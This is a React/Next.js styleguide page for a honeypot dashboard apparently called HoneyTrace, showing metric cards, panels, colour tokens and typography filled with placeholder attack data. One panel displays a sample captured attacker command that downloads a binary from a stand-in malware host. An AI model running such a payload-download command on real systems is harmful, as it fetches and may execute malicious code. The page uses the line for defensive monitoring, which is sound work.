/**
 * /styleguide: internal reference for the design tokens and UI components.
 * Not linked from the nav and excluded from search indexing.
 */
import type { Metadata } from "next";
import { Globe, HeartPulse, ShieldAlert, TriangleAlert } from "lucide-react";
import { Button } from "@/components/ui/button";
import { MetricCard } from "@/components/ui/metric-card";
import { Panel } from "@/components/ui/panel";

// Documentation-range IPs (RFC 5737): safe placeholders, never real hosts.
const topIps = [
  { ip: "203.0.113.47", geo: "NL", hits: 1284, tone: "text-alert" },
  { ip: "198.51.100.23", geo: "VN", hits: 912, tone: "text-warn" },
  { ip: "192.0.2.118", geo: "BR", hits: 377, tone: "text-ink" },
  { ip: "203.0.113.9", geo: "US", hits: 141, tone: "text-ink" },
];

const swatches = [
  { name: "canvas", hex: "#070B14", cls: "bg-canvas", note: "Page background" },
  { name: "surface", hex: "#0E1524 / 60%", cls: "bg-surface", note: "Glass panels" },
  { name: "line", hex: "#1A2436", cls: "bg-line", note: "Borders" },
  { name: "cyan", hex: "#00F0FF", cls: "bg-cyan", note: "Primary accent" },
  { name: "alert", hex: "#FF2E63", cls: "bg-alert", note: "Critical / malicious" },
  { name: "warn", hex: "#FFB800", cls: "bg-warn", note: "Suspicious" },
  { name: "ok", hex: "#39FF14", cls: "bg-ok", note: "Healthy / benign" },
  { name: "ink", hex: "#E6F1FF", cls: "bg-ink", note: "Primary text" },
  { name: "ink-dim", hex: "#7A8CA6", cls: "bg-ink-dim", note: "Secondary text" },
  { name: "ink-muted", hex: "#3D4A5C", cls: "bg-ink-muted", note: "Decoration only" },
];

export const metadata: Metadata = {
  title: "Styleguide",
  robots: { index: false, follow: false },
};

// 12 two-hour buckets covering the last 24h, oldest first (UTC).
const hours = Array.from({ length: 12 }, (_, i) => `${String(i * 2).padStart(2, "0")}:00Z`);

export default function Styleguide() {
  return (
    <div className="relative">
      <div className="mx-auto max-w-5xl space-y-8">
        <header className="space-y-2">
          <p className="micro-label">Internal · Styleguide</p>
          <h1 className="text-4xl font-bold text-cyan text-glow-cyan">HoneyTrace</h1>
          <p className="max-w-2xl text-ink-dim">
            Reference for the design tokens and UI components. Not linked from the nav.
          </p>
        </header>


        {/* ---------------- Step 5: <MetricCard> KPI row ---------------- */}
        <div className="space-y-3">
          <p className="micro-label">Step 5 · Metric cards</p>
          <div className="grid gap-4 sm:grid-cols-2 xl:grid-cols-4">
            <MetricCard
              label="Sessions (24h)"
              value={1284}
              delta={{ value: 18.2, period: "vs prev 24h" }}
              trend={[61, 74, 58, 92, 88, 79, 103, 121, 117, 134, 128, 129]}
              trendLabels={hours}
              status="warn"
            />
            <MetricCard
              label="Unique attacker IPs"
              value={312}
              delta={{ value: -4.1, period: "vs prev 24h" }}
              trend={[31, 29, 33, 27, 30, 26, 24, 28, 25, 23, 22, 14]}
              trendLabels={hours}
              status="info"
            />
            <MetricCard
              label="Critical classifications"
              value={7}
              delta={{ value: 133.3, period: "vs prev 24h" }}
              trend={[0, 0, 1, 0, 0, 0, 1, 0, 2, 0, 1, 2]}
              trendLabels={hours}
              status="alert"
            />
            <MetricCard
              label="Classifier confidence"
              value={91.6}
              format="percent"
              higherIsBetter
              delta={{ value: 1.3, period: "vs 7-day avg" }}
              trend={[88.1, 89.4, 89.0, 90.2, 90.8, 90.1, 91.3, 90.9, 91.8, 91.2, 92.0, 91.6]}
              trendLabels={hours}
              status="ok"
            />
          </div>
        </div>

        {/* ---------------- Step 4: <Panel> variants ---------------- */}
        <div className="space-y-3">
          <p className="micro-label">Step 4 · Panel component</p>
          <div className="grid gap-4 md:grid-cols-2 xl:grid-cols-3">
            <Panel
              title="Top source IPs"
              icon={Globe}
              meta="Last 24h"
              padding="none"
              actions={
                <Button variant="ghost" size="sm" className="h-6 px-2 text-[11px] text-ink-dim">
                  View all
                </Button>
              }
            >
              <ul className="divide-y divide-line/70">
                {topIps.map((r) => (
                  <li key={r.ip} className="data flex items-center justify-between px-4 py-2.5 text-sm">
                    <span className={r.tone}>{r.ip}</span>
                    <span className="text-ink-dim">
                      {r.geo} <span className="ml-3 text-ink">{r.hits.toLocaleString("en-US")}</span>
                    </span>
                  </li>
                ))}
              </ul>
            </Panel>

            <Panel title="Critical session" icon={ShieldAlert} tone="alert" glow="always" meta="sess c0a8e1f2b3d4">
              <p className="text-sm text-ink">Post-exploitation activity: payload download attempted.</p>
              <pre className="data mt-3 overflow-x-auto rounded-md border border-alert/25 bg-canvas/70 p-3 text-xs text-alert">
                wget http://malware.example/x86.bin
              </pre>
              <p className="mt-3 text-xs text-ink-dim">tone=&quot;alert&quot; glow=&quot;always&quot;</p>
            </Panel>

            <Panel title="Sensor health" icon={HeartPulse} tone="ok" meta="cowrie-01">
              <dl className="data grid grid-cols-2 gap-y-2 text-sm">
                <dt className="text-ink-dim">SSH :22</dt>
                <dd className="text-right text-ok">LISTENING</dd>
                <dt className="text-ink-dim">Log lag</dt>
                <dd className="text-right text-ink">0.4s</dd>
              </dl>
              <p className="mt-3 text-xs text-ink-dim">tone=&quot;ok&quot;, glows on hover</p>
            </Panel>

            <Panel title="Rate limit" icon={TriangleAlert} tone="warn" glow="none" headingLevel={3}>
              <p className="text-sm text-ink-dim">tone=&quot;warn&quot; glow=&quot;none&quot;: tinted border, never glows.</p>
            </Panel>

            <Panel corners={false}>
              <p className="text-sm text-ink-dim">
                No title and corners=&#123;false&#125;: just the glass surface. Hover it for the default cyan glow.
              </p>
            </Panel>

            <Panel title="Edge-to-edge" meta="padding=none" padding="none">
              <div className="h-24 bg-[repeating-linear-gradient(90deg,rgb(0_240_255/0.08)_0_2px,transparent_2px_14px)]" />
            </Panel>
          </div>
        </div>

        {/* Palette */}
        <section className="glass rounded-xl p-6">
          <h2 className="micro-label mb-5">Palette</h2>
          <div className="grid grid-cols-2 gap-4 sm:grid-cols-5">
            {swatches.map((s) => (
              <div key={s.name} className="space-y-2">
                <div className={`h-14 rounded-md border border-line ${s.cls}`} />
                <div className="font-heading text-sm text-ink">{s.name}</div>
                <div className="data text-xs text-ink-dim">{s.hex}</div>
                <div className="text-xs text-ink-dim">{s.note}</div>
              </div>
            ))}
          </div>
        </section>

        {/* Typography */}
        <section className="glass rounded-xl p-6 space-y-4">
          <h2 className="micro-label">Typography</h2>
          <p className="font-heading text-2xl font-semibold">Space Grotesk · Threat overview</p>
          <p className="text-ink-dim">
            Inter for interface copy. Attackers tried 1,284 credential pairs in the last hour.
          </p>
          <div className="data space-y-1 rounded-md border border-line bg-canvas/60 p-4 text-sm">
            <div>
              <span className="text-ink-dim">2026-10-16T22:14:07.391Z</span>{" "}
              <span className="text-cyan">203.0.113.47</span>{" "}
              <span className="text-warn">cowrie.command.input</span>{" "}
              <span className="text-ink">uname -a</span>
            </div>
            <div>
              <span className="text-ink-dim">sha256</span>{" "}
              <span className="break-all text-alert">0f3a9c41e7b2d8f05a6c19e4b7d2a08f3c5e91b6d4a7f2c08e1b5d9a3f6c7e20</span>
            </div>
          </div>
        </section>

        {/* Surfaces and states */}
        <section className="grid gap-4 sm:grid-cols-3">
          <div className="glass glow-hover rounded-xl p-5">
            <p className="micro-label">Hover me</p>
            <p className="mt-2 text-sm text-ink-dim">glass + glow-hover: border lights up cyan.</p>
          </div>
          <div className="glass rounded-xl p-5 shadow-glow-alert">
            <p className="micro-label text-alert">Critical</p>
            <p className="data mt-2 text-2xl text-alert text-glow-alert">97</p>
          </div>
          <div className="glass rounded-xl p-5">
            <p className="micro-label">Status dots</p>
            <div className="mt-3 flex items-center gap-4 text-sm">
              <span className="flex items-center gap-2"><span className="size-2 rounded-full bg-ok shadow-glow-ok animate-pulse-dot" />OK</span>
              <span className="flex items-center gap-2"><span className="size-2 rounded-full bg-warn shadow-glow-warn" />Warn</span>
              <span className="flex items-center gap-2"><span className="size-2 rounded-full bg-alert shadow-glow-alert" />Alert</span>
            </div>
          </div>
        </section>

        {/* shadcn components inherit the palette */}
        <section className="glass rounded-xl p-6">
          <h2 className="micro-label mb-4">shadcn/ui inherits the theme</h2>
          <div className="flex flex-wrap gap-3">
            <Button>Primary</Button>
            <Button variant="outline">Outline</Button>
            <Button variant="secondary">Secondary</Button>
            <Button variant="ghost">Ghost</Button>
            <Button variant="destructive">Destructive</Button>
          </div>
        </section>
      </div>
    </div>
  );
}
